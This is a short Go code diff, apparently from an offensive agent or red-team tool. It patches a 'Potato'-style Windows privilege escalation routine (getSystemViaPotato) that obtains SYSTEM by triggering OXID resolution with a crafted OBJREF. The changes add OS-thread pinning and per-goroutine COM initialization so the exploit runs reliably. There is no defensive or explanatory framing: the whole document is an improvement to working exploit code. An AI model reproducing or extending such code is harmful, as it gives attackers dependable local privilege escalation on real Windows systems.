@@ -7,6 +7,7 @@ import (
 	"encoding/base64"
 	"encoding/binary"
 	"fmt"
+	"runtime"
 	"strings"
 	"sync"
 	"syscall"
@@ -266,6 +267,11 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 		}
 	}
 
+	// Pin this goroutine to an OS thread — COM state is per-thread and
+	// Go's scheduler can migrate goroutines between OS threads.
+	runtime.LockOSThread()
+	defer runtime.UnlockOSThread()
+
 	// Phase 1: Initialize COM (loads combase.dll) and scan for ORCB RPC interface
 	procCoInitializeEx.Call(0, 0) // COINIT_MULTITHREADED = 0
 	defer procCoUninitialize.Call()
@@ -439,8 +445,13 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 
 	// Phase 6: Trigger OXID resolution via crafted OBJREF.
 	// Run in a goroutine because CoUnmarshalInterface can block if RPCSS hangs.
+	// The trigger goroutine needs its own COM initialization and thread pinning.
 	triggerDone := make(chan error, 1)
 	go func() {
+		runtime.LockOSThread()
+		defer runtime.UnlockOSThread()
+		procCoInitializeEx.Call(0, 0)
+		defer procCoUninitialize.Call()
 		triggerDone <- triggerOXIDResolution(oxid, oid, ipid)
 	}()
 
